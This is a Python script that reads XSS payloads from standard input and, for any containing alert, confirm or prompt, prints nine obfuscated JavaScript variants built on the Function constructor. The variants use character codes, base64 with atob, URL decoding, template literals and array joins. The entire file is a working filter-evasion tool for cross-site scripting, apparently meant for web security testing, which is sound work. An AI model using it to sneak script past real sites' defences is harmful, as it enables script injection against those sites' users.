import sys
import re

def function_constructor_encode(payload):
    keywords = ['confirm', 'alert', 'prompt']
    for keyword in keywords:
        pattern = re.compile(keyword, re.IGNORECASE)
        match = pattern.search(payload)
        if match:
            start = match.start()
            encoded_payloads = []
            
            function_call = payload[start:]
            
            # Function constructor with string
            encoded_payloads.append(f"new Function('{function_call}')()")
            
            # Function constructor with return
            encoded_payloads.append(f"new Function('return {function_call}')()")
            
            # Function constructor with character codes
            char_codes = ','.join(str(ord(c)) for c in function_call)
            encoded_payloads.append(f"new Function(String.fromCharCode({char_codes}))()")
            
            # Function constructor with keyword only
            rest = payload[start + len(keyword):]
            char_codes_keyword = ','.join(str(ord(c)) for c in keyword)
            encoded_payloads.append(f"new Function(String.fromCharCode({char_codes_keyword})+'{rest}')()")
            
            # Function constructor with eval
            encoded_payloads.append(f"new Function('eval','{function_call}')()")
            
            # Function constructor with atob
            import base64
            b64_encoded = base64.b64encode(function_call.encode()).decode()
            encoded_payloads.append(f"new Function(atob('{b64_encoded}'))()")
            
            # Function constructor with decodeURIComponent
            from urllib.parse import quote
            url_encoded = quote(function_call)
            encoded_payloads.append(f"new Function(decodeURIComponent('{url_encoded}'))()")
            
            # Function constructor with template literal
            encoded_payloads.append(f"new Function(`{function_call}`)()")
            
            # Function constructor with array join
            char_array = ','.join(f"'{c}'" for c in function_call)
            encoded_payloads.append(f"new Function([{char_array}].join(''))()")
            
            return encoded_payloads
    return [payload]

if __name__ == "__main__":
    for line in sys.stdin:
        payload = line.strip()
        encoded_payloads = function_constructor_encode(payload)
        for ep in encoded_payloads:
            print(ep)

